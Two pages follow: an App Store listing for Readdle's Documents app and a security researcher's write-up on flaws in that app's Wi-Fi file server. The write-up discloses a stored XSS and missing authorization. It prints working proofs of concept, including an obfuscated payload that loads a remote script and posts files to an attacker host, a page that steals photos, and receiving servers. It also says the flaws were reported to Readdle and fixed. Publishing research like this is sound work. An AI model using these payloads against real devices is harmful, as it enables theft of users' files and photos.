=== Content from apps.apple.com_8ca60a37_20250121_001007.html ===


* [Apple](https://www.apple.com/)
* + [Store](https://www.apple.com/us/shop/goto/store)
  + [Mac](https://www.apple.com/mac/)
  + [iPad](https://www.apple.com/ipad/)
  + [iPhone](https://www.apple.com/iphone/)
  + [Watch](https://www.apple.com/watch/)
  + [Vision](https://www.apple.com/apple-vision-pro/)
  + [AirPods](https://www.apple.com/airpods/)
  + [TV & Home](https://www.apple.com/tv-home/)
  + [Entertainment](https://www.apple.com/entertainment/)
  + [Accessories](https://www.apple.com/us/shop/goto/buy_accessories)
  + [Support](https://support.apple.com/?cid=gn-ols-home-hp-tab)
* 0+

[App Store](https://www.apple.com/ios/app-store/) Preview

![](/assets/artwork/1x1-42817eea7ade52607a760cbee00d1495.gif)

# Documents: File Manager & Docs 17+

## Browser, Reader & Media Player

## [Readdle Technologies Limited](https://apps.apple.com/us/developer/readdle-technologies-limited/id285035419)

### Designed for iPad

* [#95 in Productivity](https://apps.apple.com/us/charts/iphone/productivity-apps/6007)
* + 4.8 â¢ 596.9K Ratings

* + Free
  + Offers In-App Purchases

## Screenshots

* [iPad](/us/app/documents-file-manager-docs/id364901807?platform=ipad)
* [iPhone](/us/app/documents-file-manager-docs/id364901807?platform=iphone)

* ![](/assets/artwork/1x1-42817eea7ade52607a760cbee00d1495.gif)
* ![](/assets/artwork/1x1-42817eea7ade52607a760cbee00d1495.gif)
* ![](/assets/artwork/1x1-42817eea7ade52607a760cbee00d1495.gif)
* ![](/assets/artwork/1x1-42817eea7ade52607a760cbee00d1495.gif)
* ![](/assets/artwork/1x1-42817eea7ade52607a760cbee00d1495.gif)
* ![](/assets/artwork/1x1-42817eea7ade52607a760cbee00d1495.gif)
* ![](/assets/artwork/1x1-42817eea7ade52607a760cbee00d1495.gif)
* ![](/assets/artwork/1x1-42817eea7ade52607a760cbee00d1495.gif)
* ![](/assets/artwork/1x1-42817eea7ade52607a760cbee00d1495.gif)
* ![](/assets/artwork/1x1-42817eea7ade52607a760cbee00d1495.gif)

## Description

Documents is the super app for iPhone & iPad. Read, listen, view and annotate almost anything you want on your iPad and iPhone. Files, documents, books, and any content is at home in Documents by Readdle.

The Documents app is the most capable application on your iOS device. Itâs the hub for all your files. Our app replaces a document viewer, PDF reader, "read it later", music and video player, file downloader, cloud integrator, and other useful applications â in one elegant app experience.

Amazing attention to detail, unmatched stability and design differ Documents from any app you have on the iPhone or iPad. Use it for all of your needs at the home, office, university, or on the go every single day. Whether you need it to play audio, video, transfer files, edit PDFs or more, the Documents app has you covered.

An audio player, file or download manager and editor â all in one app. Our features bring you everything you need to get it all done. Just have a look at the shortlist of features that the Documents app allows you to do simply and conveniently.

DOCUMENTS FEATURES

AUDIO & VIDEO PLAYER
â¢ Listen to music online and offline with the Documents app
â¢ Watch movies by importing them from your computer or online sources
â¢ Get great and easy access to your photo and video library

TRANSFER & MANAGE FILES & FOLDERS
â¢ Manage your files and create folders for all of your needs
â¢ Use features like zip/unzip, color tag, rename and others
â¢ Easily share files with friends, colleagues, coworkers and others
â¢ Drag and drop files across apps. Just open two Readdle apps in Split View on iPad\* and simply move files between them

IMPORT & SAVE FILES
â¢ All your cloud storage is placed in the âMy Filesâ section
â¢ Import files from your computer, cloud, WebDav, or any nearby devices
â¢ With the Documents app, you can download files from the Web
â¢ Store email attachments in a single place
â¢ Easily save web pages to read them later

READ AND EDIT PDFs
â¢ Open Office files and eBooks with a few taps
â¢ View and mark up PDFs right from Documents
â¢ Modify PDF text and images with a few taps
â¢ Manage pages in your PDFs for organized files
â¢ Convert anything into a PDF easily

INTEGRATE ALL CLOUD SERVICES
â¢ Connect all cloud services to Documents and access your personal and business files anytime
â¢ Work in iCloud, Dropbox, Google Drive, and other Services without downloading files
â¢ Set up two-way sync to specific folders to automatically upload your files

VPN SECURITY & PASSWORD PROTECTION
â¢ Our VPN encrypts your data to keep you safe from peering eyes
â¢ Add a layer of additional protection to your files and information with a password

SMART ACTIONS
â¢ Contextual recommendations that save your time, suggesting the best next action to take.

SEE WHAT OTHERS HAVE SAID ABOUT OUR APP
Documents won App Store Editors' Choice in 70+ countries

"It's a tool that will help you stay better organized." - The Verge
"The app is super quick, it looks good and options are easy to locate and use." - The Next Web
"A surprising versatile app for consumers and businesses alike." - USA Today

Documents is a must-have app for your iPhone and iPad!
If you choose to purchase Documents Plus, payment will be charged to your iTunes account, and your account will be charged for renewal within 24 hours prior to the end of the current period. Auto-renewal may be turned off at any time by going to your settings in the iTunes Store after purchase. Current Documents Plus subscription price starts at $9.99 USD/month. Prices are in US dollars, may vary in countries other than the US, and are subject to change without notice. If you donât choose to purchase Documents Plus, you can simply continue using Documents for free. Any unused portion of a free trial period, if offered, will be forfeited when you purchase a subscription, where applicable.

Read more about our terms and conditions here:
https://readdle.com/privacy
https://readdle.com/documents/terms

## Whatâs New

Jan 7, 2025

Version 8.14.14

Greetings!
This is just a minor improvement release.
We appreciate your feedback; please donât hesitate to contact us at rdsupport@readdle.com with any questions and suggestions.

## Ratings and Reviews

4.8 out of 5
596.9K Ratings

596.9K Ratings

p0015h4rk

,
05/24/2024
### ð¯Download It â You Will Not Be Disappointed

> Hands-down, without a question this is the best folder, organization app on the App Store. Completely free, not including features that are not needed, with built-in, audio, video, PDF, and any other file preview that you need. Built-in cloud access, which enables you to literally login to all of your cloud accounts, across-the-board all at the same time and stays logged in so you have access to all of those files. You also have access to the native files and the native photos, making it the only app that you need to access every single file on your iPad/iPhone. Built-in Web-DAV server, giving you the ability to transfer any file or folder to and from your iPad/iPhone. Built-in browser so that you donât have to go from one app to the other if you need to grab something off the Internet that you havenât already downloaded. Readdle is an amazing developer who has my backing 100%. I have no intention of using any other app because literally there is no other app that can do as much as this app can do; at least not all in one place. If I could give it a 10 star rating I would because after three years of using it, I have not been disappointed once.

### Developer Response ,

> Hi! Big thanks for the awesome review! ð We're thrilled to know our app is adding value to your experience. Your encouraging words drive us to keep evolving and enhancing your app journey. Rest assured, we're dedicated to making our app even more impressive. If you ever have thoughts to share or suggestions, we're all ears. Your feedback is crucial in shaping the app's future, and we greatly appreciate it. Thanks for being an essential part of our community. Mykyta

djc0

,
12/22/2022
### Oh god the massive icons

> 2nd EDIT: I feel like Iâve been a bit harsh. Sorry devs, i know you work hard to make a great product. I just checked, and i first downloaded Documents (and also Scanner Pro) in 2010! Thatâs how long Iâve been on the Readdle train, and have been a happy customer the whole time. I still hope you give us the option to have small icons again though. :)
>
> EDIT: I appreciate the dev response, but itâs basically âYouâll get used to itâ. I donât use the grid view and I donât want massive icons on my screen ok any view. Iâm pretty sure this goes against Appleâs design guidelines (none of their apps use massive icons). Of course you can make your app how you want, but just in case you need an example that you are the anomaly. Please at least give us the option to resize. I donât have a phablet-sized screen. ORIGINAL: Did you even do some UX testing, or just decide that you personally liked this better? My eyes are burning. Please follow Appleâs UI and UX guidelines. Or at least give us a ânormal sizeâ button so we can choose. Also, reading your reply to another review, I donât want to see all this information the massive icons allow.

### Developer Response ,

> Hello there, thank you for your feedback. I've added your vote to the app wish list, and we'll be sure to let our customers know if it's brought back. Weâre always working on improvements to make the app even more useful.
> Daria

MEGAPIE06

,
09/21/2021
### They fixed it (kind of)

> So I reviewed this app half a year ago mentioning that the app works great for my use case, but every single time I want to download a file I find it almost impossible to select the file on the first try. The tiny button you have to push to open the share menu requires so much precision to press that it is always an annoyance. While the new redesign did not fix the button itself, it added a pop-up at the bottom of the app when you add a new file which allows you to access the share menu with a much bigger button. Not the fix I was expecting, but totally solved my problem. \_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_ Original review: The (...) button on each file is almost impossible to tap, at least on the iPhone 12 Mini. I have to try at least 6 times times every time I want to download a video, meanwhile the video will start up every time I miss the button by a few pixels. I donât have thick fingers itâs just a really small area the button will accept a tap from. Please make it bigger.

### Developer Response ,

> Hi there ð
> Thank you for your review and feedback.
> I am glad that the app fits your needs. If you have any further thoughts to share, feel free to contact us directly at rdsupport@readdle.com and provide us with the details about the case. Weâd be happy to help you. Have a great day!
> Daria.

## App Privacy

The developer, Readdle Technologies Limited, indicated that the appâs privacy practices may include handling of data as described below. For more information, see the [developerâs privacy policy](https://readdle.com/documents/privacy).

### Data Linked to You

The following data may be collected and linked to your identity:

* Identifiers
* Usage Data

### Data Not Linked to You

The following data may be collected but it is not linked to your identity:

* Contact Info
* Identifiers
* Diagnostics

Privacy practices may vary, for example, based on the features you use or your age. [LearnÂ More](https://apps.apple.com/story/id1538632801)

## Information

Seller
Readdle Technologies Limited

Size
324.7 MB

Category
[Productivity](https://itunes.apple.com/us/genre/id6007)

Compatibility
iPhone

Requires iOS 16.0 or later.

iPad

Requires iPadOS 16.0 or later.

Mac

Requires macOSÂ 13.0 or later and a Mac with AppleÂ M1Â chip or later.

Apple Vision

Requires visionOS 1.0 or later.

Languages

English, French, German, Italian, Japanese, Portuguese, Russian, Simplified Chinese, Spanish, Ukrainian, Vietnamese

Age Rating
17+
Unrestricted Web Access

Copyright
Â© 2008 - 2025 Readdle Technologies Limited

Price
Free

In-App Purchases

- Documents Plus
  $9.99
- Documents Plus
  $9.99
- Documents Plus
  $12.49
- Professional PDF Editor
  $49.99
- Documents Plus
  $9.99
- Documents Plus
  $12.49
- Professional PDF Editor
  $49.99
- Documents Plus
  $89.99
- Documents Plus
  $89.99
- Professional PDF Editor
  $49.99

* [Developer Website](https://readdle.com/documents?utm_source=AppStore&utm_medium=product-page&utm_campaign=appstore-marketing)
* [App Support](https://support.readdle.com/documents?utm_source=AppStore&utm_medium=product-page&utm_campaign=appstore-support)
* [Privacy Policy](https://readdle.com/documents/privacy)

* [Developer Website](https://readdle.com/documents?utm_source=AppStore&utm_medium=product-page&utm_campaign=appstore-marketing)
* [App Support](https://support.readdle.com/documents?utm_source=AppStore&utm_medium=product-page&utm_campaign=appstore-support)
* [Privacy Policy](https://readdle.com/documents/privacy)

## More By This Developer

[![Calendars: Planner & Organizer](/assets/artwork/1x1-42817eea7ade52607a760cbee00d1495.gif)

Calendars: Planner & Organizer

Productivity](https://apps.apple.com/us/app/calendars-planner-organizer/id608834326)
[![PDF Expert - Editor and Reader](/assets/artwork/1x1-42817eea7ade52607a760cbee00d1495.gif)

PDF Expert - Editor and Reader

Productivity](https://apps.apple.com/us/app/pdf-expert-editor-and-reader/id743974925)
[![Spark Mail + AI: Email Inbox](/assets/artwork/1x1-42817eea7ade52607a760cbee00d1495.gif)

Spark Mail + AI: Email Inbox

Productivity](https://apps.apple.com/us/app/spark-mail-ai-email-inbox/id997102246)
[![Scanner Pro - Scan Documents](/assets/artwork/1x1-42817eea7ade52607a760cbee00d1495.gif)

Scanner Pro - Scan Documents

Business](https://apps.apple.com/us/app/scanner-pro-scan-documents/id333710667)
[![Scanner Mini â Scan PDF & Fax](/assets/artwork/1x1-42817eea7ade52607a760cbee00d1495.gif)

Scanner Mini â Scan PDF & Fax

Productivity](https://apps.apple.com/us/app/scanner-mini-scan-pdf-fax/id581365763)
[![Fluix Docs](/assets/artwork/1x1-42817eea7ade52607a760cbee00d1495.gif)

Fluix Docs

Business](https://apps.apple.com/us/app/fluix-docs/id893992075)

## You Might Also Like

[![Files - File Manager & Browser](/assets/artwork/1x1-42817eea7ade52607a760cbee00d1495.gif)

Files - File Manager & Browser

Productivity](https://apps.apple.com/us/app/files-file-manager-browser/id349275540)
[![Ostrich VPN - Proxy Master](/assets/artwork/1x1-42817eea7ade52607a760cbee00d1495.gif)

Ostrich VPN - Proxy Master

Productivity](https://apps.apple.com/us/app/ostrich-vpn-proxy-master/id1532634346)
[![Best VPN Proxy AppVPN](/assets/artwork/1x1-42817eea7ade52607a760cbee00d1495.gif)

Best VPN Proxy AppVPN

Productivity](https://apps.apple.com/us/app/best-vpn-proxy-appvpn/id1004216430)
[![Mask VPN -  Fast & Secure](/assets/artwork/1x1-42817eea7ade52607a760cbee00d1495.gif)

Mask VPN - Fast & Secure

Productivity](https://apps.apple.com/us/app/mask-vpn-fast-secure/id1561479393)
[![Ostrich VPN Light - Fast Proxy](/assets/artwork/1x1-42817eea7ade52607a760cbee00d1495.gif)

Ostrich VPN Light - Fast Proxy

Productivity](https://apps.apple.com/us/app/ostrich-vpn-light-fast-proxy/id1658312021)
[![V2Lite VPN - Super VPN Proxy](/assets/artwork/1x1-42817eea7ade52607a760cbee00d1495.gif)

V2Lite VPN - Super VPN Proxy

Productivity](https://apps.apple.com/us/app/v2lite-vpn-super-vpn-proxy/id6444585377)

Copyright Â© 2025
Apple Inc.
All rights reserved.

[Internet Service Terms](https://www.apple.com/legal/internet-services/)
[App Store & Privacy](https://www.apple.com/legal/privacy/data/en/app-store)
[Cookie Warning](https://www.apple.com/privacy/use-of-cookies/)
[Support](https://support.apple.com/billing)

More ways to shop: [Find an Apple Store](https://www.apple.com/retail/) or [other retailer](https://locate.apple.com/) near you. Or call 1-800-MY-APPLE.

[Choose your country or region](https://www.apple.com/choose-country-region/ "Choose your country or region")

Copyright © 2024 Apple Inc. All rights reserved.

* [Privacy Policy](https://www.apple.com/legal/privacy/)
* [Terms of Use](https://www.apple.com/legal/internet-services/terms/site.html)
* [Sales and Refunds](https://www.apple.com/us/shop/goto/help/sales_refunds)
* [Legal](https://www.apple.com/legal/)
* [Site Map](https://www.apple.com/sitemap/)



=== Content from logicaltrust.net_466033c3_20250121_001008.html ===

Menu

[![](/images/logo.svg)](/en/)

* [Home](/en/)
* [Services](/en/#services)
* [Blog](/blog.html)
* [About us](/about.html)
* [Contact](#contact)

* [**EN**](/en/)
* [PL](/)

# [EN] A-Z: Documents - hacking web app inside iOS app

Documents is an iOS file manager app developed by Readdle. It has an HTTP server feature, which allows easy file transfer between the device and a computer in a local network. It’s also very interesting from the security perspective because we can expect a wider attack surface than in a typical mobile application. Running an HTTP server may expose the application to many kinds of web-related attacks.

* [XSS](#xss)
  + [Exploitation](#xss-exploitation)
    - [Delivery](#xss-delivery)
    - [Payload, PoC](#xss-payload)
    - [PoC video](#xss-video)
  + [Bonus](#xss-bonus)
* [Lack of authorization](#authorization)
  + [Exploitation](#auth-exploit)
  + [PoC](#auth-poc)
    - [Video](#authorization-video)
* [Submission](#submission)

Typical usage scenario of this feature:

1. The user starts an HTTP server in the app.
2. User types device’s IP address in a desktop browser.
3. On the device, a randomly generated PIN appears.
4. The user rewrites the PIN from the app to the browsers.
   ![](/images/documents/1.png)
5. The user becomes authenticated and granted access to the app data.
   ![](/images/documents/2.png)

## XSS

The application displays user-controllable data, so I decided to check if it can be abused somehow.

I created a directory with a payload `<img loading="lazy" src=x onerror=alert(2)>` in its name. (yeah, these characters are completely legal on iOS, macOS, Linux, etc.), but nothing happened - the directory name was displayed correctly.

![](/images/documents/xss1.png)

However, there’s one more place where these names are displayed. It’s a current directory path, above file list, which is not so obvious while being in the root path. I entered my malicious directory and the payload executed - it was improperly displayed exactly in this place.

![](/images/documents/xss2.png)

Ok, so I XSSed myself and that’s it? Of course not!

### Exploitation

#### Delivery

I started wondering how this vulnerability could be used in a real-life scenario. I asked myself two questions, which lead me to a scenario requiring a little interaction with a victim.

1. How to put malicious directory in on a victim’s device?
2. How to convince the victim to open in it in a browser?
   An attack without user interaction would be awesome, but I didn’t find a way to do it.

Payload in directory name is a must, but it is possible to hide it a little bit. Documents handle zip files - by tapping an archive the app automatically unpacks it. On the other hand, Documents (and iOS itself) does not handle many common file formats like `docx`. So the user seeing `docx` may try opening it on the desktop.

Summarizing these steps:

1. Create malicious directory

```
$ mkdir '<img loading="lazy" src=x onerror=alert(2)>'
```

2. Create a `docx` file:

```
$ touch '<img loading="lazy" src=x onerror=alert(2)>/1.docx'
```

3. Zip it.

```
$ zip anything.zip '<img loading="lazy" src=x onerror=alert(2)>'
```

4. Send it to a victim (for example using email or any communicator).
5. The victim saves the attachment in Documents, unpacks it, notices a file in the unsupported format, then decides to open the file on the desktop.
6. The victim opens the browser navigates to Documents HTTP server.
7. The victim enters a directory from the archive - payload executes.

#### Payload, PoC

I couldn’t forget about payload. Popping `alert` is always fun, but what real harm could be done?

XSS gives full control over the affected web page (in a range of origin). So the first thing which came to my mind was just to steal files. Payload could read a list of files and directories and recursively go through them (download) and send them to the attacker’s server. I created PoC, but for quicker development, I decided to steal one file which path was hardcoded in payload.

Directory name:

```
Invoices <img loading="lazy" src=y onerror="s=document.createElement(&quot;script&quot;);s.setAttribute(&quot;src&quot;,atob(&quot;aHR0cDovLzE3Mi4yMC4xMC4yOjgwMDAvMS5qcw==&quot;));document.head.appendChild(s);">
```

This code would dynamically add script from `http://172.20.10.2:8000/1.js`. This is the IP of the attacker’s server (it could be an address on the local network or the Internet).

Content of `1.js` file:

```
var x = new XMLHttpRequest();
x.open("GET","/rdwifidrive/open?sid=" + getSID() + "&path=%2Fother%2Fsecret.txt");
x.onreadystatechange = function() {
  if (x.readyState == 4) {
    var y = new XMLHttpRequest();
    y.open("POST", "http://evil.local:8000");
    y.send(x.response);
  }
};
x.send();
```

And simple python HTTP server to server `1.js` and receive stolen files:

```
#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler

class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):

  def do_GET(self):
    self.send_response(200)
    self.send_header("Content-type", "text/javascript");
    self.end_headers()
    with open("1.js", "rb") as f:
      self.wfile.write(f.read())

  def do_POST(self):
    length = int(self.headers['Content-Length'])
    body = self.rfile.read(length).decode("utf-8")
    print("Received:\n" + body + "\n")
    self.send_response(200)
    self.send_header("Content-Type", "text/html");
    self.end_headers()

httpd = HTTPServer(('0.0.0.0', 8000), SimpleHTTPRequestHandler)
httpd.serve_forever()
```
#### PoC video

### Bonus

When I was looking for XSSes I noticed one more thing. Device’s name is always displayed in the top-left corner (`m` in screenshots), so I changed my device’s name to check if it’s also vulnerable.

![](/images/documents/xss4.png)

But for this one, I didn’t find any practical way to use it. Unless you convince someone to change their device’s name. ;)

## Lack of authorization

The next thing on which I focused was proper authentication and authorization. I started with the most obvious mechanism - code verification. With no luck for me, the application properly handled code guessing and usage of unusual characters.

Let’s look at how this process works:

1. We send our verification code, then we receive authentication status.

```
GET /rdwifidrive/auth?step=CODE&code=2865&_=1565273848603 HTTP/1.1
Host: 172.20.10.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://172.20.10.1/
X-Requested-With: XMLHttpRequest
DNT: 1
Connection: close

HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
X-USBGate: lighttpd/compat
Accept-Ranges: bytes
Content-Length: 15
Content-Type: application/json
Date: Thu, 08 Aug 2019 14:17:43 GMT

{"status":"OK"}
```

2. If our code is correct, we attach it as `Session-Id` header in further requests.

```
GET /rdwifidrive/list?path=%2F&sort=sortByNameAsc&_=1565273848605 HTTP/1.1
Host: 172.20.10.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://172.20.10.1/
Session-Id: 2865
X-Requested-With: XMLHttpRequest
DNT: 1
Connection: close

HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
X-USBGate: lighttpd/compat
Accept-Ranges: bytes
Content-Length: 3078
Content-Type: application/json
Date: Thu, 08 Aug 2019 14:17:46 GMT

{"options":{"readOnly":false,"contentSort":"sortByNameAsc","layout":"default","photoLibraryContent":false,"photoLibraryAlbumContent"(...)
```

So, the application recognizes a legitimate user by `Session-Id` header. I spent some time in the web interface using different functionalities, collecting requests. Then, I went through captured traffic to check if all of the requests include this header and what would happen if I removed it.

These requests drew my attention:

```
GET /rdwifidrive/web_socket_url HTTP/1.1
Host: 172.20.10.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://172.20.10.3:8000/
Origin: http://172.20.10.3:8000
DNT: 1
Connection: close

HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
X-USBGate: lighttpd/compat
Accept-Ranges: bytes
Content-Length: 42
Content-Type: application/json
Date: Sun, 04 Aug 2019 23:43:04 GMT

{"url":"ws:\/\/172.20.10.1:49294\/socket"}
```

The application doesn’t provide only an HTTP interface, but also Web Socket. Additionally, `GET /rdwifidrive/web_socket_url` is sent without `Session-Id` header. The application responds with a web socket URL even to unauthenticated users, so I analyzed web socket communication to ensure how authentication is handled in the WS layer.

WS request:

```
PREFETCHED_PHOTOS:null
```

WS response:

```
PREFETCHED_PHOTOS:{"content":[{"actionsDisabled":false,"dateStr":"00:48","duration":"","photoLargeThumbnail":"\/photos?path=%2Frdmount%2FPhotoLibrary%2FPLVFSManagerCollectionStart_D2D42CEB-ED49-40A8-9A66-DAD609C61AFD_L0_040_PLVFSManagerCollectionEnd%2F050C73AE-DC47-4780-8D72-D767306103FA_L0_001.PNG&width=1700&height=3017&hash=PREFETCH","favorite":false,"icon":"\/fileicons?path=\/_file.png","photoSmallThumbnailWidth":220,"photoLargeThumbnailSize":"1700x3017","path":"\/rdmount\/PhotoLibrary\/PLVFSManagerCollectionStart_D2D42CEB-ED49-40A8-9A66-DAD609C61AFD_L0_040_PLVFSManagerCollectionEnd\/050C73AE-DC47-4780-8D72-D767306103FA_L0_001.PNG","photoLargeThumbnailWidth":1700,"photoOriginalHeight":1136,"photoSmallThumbnail":"\/photos?path=%2Frdmount%2FPhotoLibrary%2FPLVFSManagerCollectionStart_D2D42CEB-ED49-40A8-9A66-DAD609C61AFD_L0_040_PLVFSManagerCollectionEnd%2F050C73AE-DC47-4780-8D72-D767306103FA_L0_001.PNG&width=220&height=390&hash=PREFETCH","gridIcon":"\/filegridicons?path=\/_file.png","size":18446744073709551615,"photoOriginalWidth":640,"sizeStr":"640x1136","dataIndex":0,"filename":"2019-08-05 00.48.32","date":1564958912.9922714,"photoSmallThumbnailHeight":390,"photoOriginalSize":"640x1136","readOnly":true,"photoOriginal":"\/photos?path=%2Frdmount%2FPhotoLibrary%2FPLVFSManagerCollectionStart_D2D42CEB-ED49-40A8-9A66-DAD609C61AFD_L0_040_PLVFSManagerCollectionEnd%2F050C73AE-DC47-4780-8D72-D767306103FA_L0_001.PNG&width=640&height=1136&hash=PREFETCH","videoPath":"","photoLargeThumbnailHeight":3017},{"actionsDisabled":false,[...]
```

Yes, no authentication at all and the server responds with paths of photos from Camera. The application has (of course if you grant) permission to Photos, which are available in `Photo Albums` directory (look at the second screenshot).

These paths are then used to get (large resolution) thumbnails of photos.

```
GET /photos?path=%2Frdmount%2FPhotoLibrary%2FPLVFSManagerCollectionStart_D2D42CEB-ED49-40A8-9A66-DAD609C61AFD_L0_040_PLVFSManagerCollectionEnd%2F050C73AE-DC47-4780-8D72-D767306103FA_L0_001.PNG&width=1700&height=3017&hash=PREFETCH HTTP/1.1
Host: 172.20.10.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://172.20.10.3:8000/
Origin: http://172.20.10.3:8000
DNT: 1
Connection: close

HTTP/1.1 200 OK
Pragma: no-cache
Content-Type: image/jpeg
Expires: 0
X-USBGate: lighttpd/compat
Accept-Ranges: bytes
Date: Sun, 04 Aug 2019 23:43:06 GMT
Cache-Directive: no-cache
Pragma-Directive: no-cache
Content-Length: 137165
Cache-Control: no-cache
Access-Control-Allow-Origin: *

[binary data]
```

Something’s missing in this request too. `Session-Id` again.

### Exploitation

Putting things together, what can be done without authorization:

1. Get the WebSocket URL.
2. Connect to WebSocket and get Photos paths.
3. Download photos using the received path.

It could be enough to steal photos from users in our local network. However, there’s one more thing, which you may have noticed already:

```
Access-Control-Allow-Origin: *
```

The server relaxes Same-Origin Policy that these requests can be issued from any domain making the application additionally vulnerable to CSRF. It extends exploitation possibilities, because this attack may be performed over the Internet.

Summarizing the whole issue, how attack could be performed:

1. Attacker prepares a malicious website which:
   1. Gets WebSocket URL from a device
   2. Connects to the WebSocket and gets Photos paths
   3. Downloads photos using received paths
   4. Sends downloaded photos to the attacker’s server
2. Attacker tricks a victim into opening its page
3. The website performs steps 1.1 - 1.4, finally stealing photos.

Now, the last question may come to our minds - how the attacker may know an IP address of a victim’s device? There are two answers:

1. If a victim is connected to a WiFi network - IP must be guessed.
2. If a victim uses tethering - a device’s IP is always the same - `172.20.10.1`.

### PoC

For this vulnerability I also prepared PoC. It consists of:

1. Malicious website: `index.html`

```
<html>
<body>
<script>

var IP = "172.20.10.1";

getWebsocketUrl();

function getWebsocketUrl() {
  var x = new XMLHttpRequest();
  x.open("GET", "http://" + IP + "/rdwifidrive/web_socket_url");
  x.onreadystatechange = function() {
     if (x.readyState == 4) {
       getImagePaths(JSON.parse(x.response).url);
     }
  };
  x.send();
}

function getImagePaths(wsUrl) {
  console.log("WS: " + wsUrl);
  var ws = new WebSocket(wsUrl);
  ws.onmessage = function(msg) {
    ws.onmessage = null;
    obj = JSON.parse(msg.data.substring(18));
    stealPhotos(obj.content);
  }
  ws.onopen = function() {
    ws.send("PREFETCHED_PHOTOS:null");
  };
}

function stealPhotos(content) {
  for (var i = 0; i < content.length; i++) {
    var path = content[i].photoLargeThumbnail;
    getPhoto(path);
  }
}

function getPhoto(path) {
    console.log("Getting photo: " + path);
    var x = new XMLHttpRequest();
    x.open("GET", "http://" + IP + path);
    x.responseType = "arraybuffer";
    x.onreadystatechange = function() {
      if (x.readyState == 4) {
        sendHome(path, x.response);
      }
    };
    x.send();
}

function sendHome(path, response) {
  console.log("Sending photo: " + path);
  var name = path.split("=")[1].split("&")[0];
  var x = new XMLHttpRequest();
  x.open("POST", "/" + name);
  x.onreadystatechange = function() { };
  x.send(response);
}

</script>
</body>
</html>
```

2. Python server serving `index.html` and receiving photos.

```
#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler

class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):

  def do_GET(self):
    self.send_response(200)
    self.send_header("Content-type", "text/html; charset=utf-8");
    self.end_headers()
    with open("index.html", "rb") as f:
      self.wfile.write(f.read())

  def do_POST(self):
    length = int(self.headers['Content-Length'])
    body = self.rfile.read(length)
    name = self.path[1:]
    print("Received: " + name)
    self.send_response(200)
    self.send_header("Content-Type", "text/html");
    self.end_headers()
    with open("out/" + name, "xb") as f:
      f.write(body)

httpd = HTTPServer(('0.0.0.0', 8000), SimpleHTTPRequestHandler)
httpd.serve_forever()
```
#### Video

## Submission

These vulnerabilities were submitted to Readdle in August 2019. They quickly responded and started working on fixes. The same month Readdle updated the application. Readdle rewarded me $1100 for these findings and announced they’re going to start the official Bug Bounty program.

Written on December 8, 2019 by
Michał Dardas

## We invite you to contact us

through the following form:

**I agree to the processing of my personal data and sending the offer.**
Rules for the processing of personal data.

send

LogicalTrust sp. z o.o.
sp. k.

Stanisławowska 47
54-611 Wrocław, Poland, EU

NIP: 8952177980
KRS: 0000713515

**T.: +48 797 772 743**

**office@logicaltrust.net**
Key:   [PGP/GPG](/logicaltrust.gpg)

![LogicalTrust](/images/logo.svg)

copyright © 2007 - 2024 LogicalTrust

We support:
![las na zawsze - logo](/images/foundationlogo-lasnazawsze_a.png)
![unicef - logo](/images/foundationlogo-unicef_a.png)

×
## Rules for the processing of personal data.

According to art. 13 of the General Regulation on the Protection of Personal Data of 27 April 2016 (Official Journal EU L 119 of 04.05.2016) I inform that:

* **Data Administrator:** The administrator of your personal data is Logicaltrust sp. z o.o. sp. k., with its registered office at ul. Stanisławowska 47, 54-611 Wrocław, Tax Identification Number (NIP): 8952177980, National Business Registry Number (REGON): 369271084, National Court Register Number (KRS): 0000713515.
* **Contact with the Data Administrator:** You can contact the data administrator via email at: ado@logicaltrust.net or by traditional mail by sending a letter to the administrator's registered office address.
* **Purpose and Legal Basis for Processing Personal Data:** Your personal data will be processed by the data administrator for the purpose of responding to your inquiries, executing requested contact, taking actions prior to entering into a contract, performing the contract, establishing business relationships, presenting offers upon potential client's request (based on Art. 6(1)(a), (b), and (f) of the General Data Protection Regulation).
* **Data Processing Period:** Your personal data will be processed for the time necessary to clarify your matter and provide a comprehensive response. They will also be processed for the duration of cooperation and the contract (in this case, the data is processed as client data). In the event of non-cooperation, the data will be promptly deleted unless there is a need for further retention for the purpose of defense and protection against claims. In cases where the processing of personal data is based on voluntarily given consent according to Art. 6(1)(a) of the General Data Protection Regulation, you have the right to withdraw your consent at any time. The withdrawal of consent does not affect the lawfulness of processing based on consent before its withdrawal, in accordance with the applicable law.
* **Scope of Processed Data:** The scope of processed data includes: first name, last name, email, and phone number.
* **Recipients of Personal Data:** In specific situations, your personal data may be disclosed, for example, to fulfill a legal obligation or to exercise legally justified interests pursued by the data administrator or by a third party. The categories of recipients to whom the data administrator may disclose your personal data are entities or authorities authorized by law and service providers processing personal data on behalf of the data administrator based on data processing agreements (e.g., hosting company).
* **Data Transfers:** Your personal data will not be transferred outside the European Economic Area.
* **Rights and Entitlements:** You have the right to request access to your personal data, their correction, deletion, or processing limitations, as well as the right to object to data processing. You also have the right to file a complaint with the President of the Personal Data Protection Office (ul. Stawki 2, 00-193 Warsaw) if you believe that the processing of personal data violates data protection regulations.
* **Additional Information:** Providing data is voluntary, but failure to provide data necessary for correspondence may hinder the execution and maintenance of contact.

×
## Cookie policy

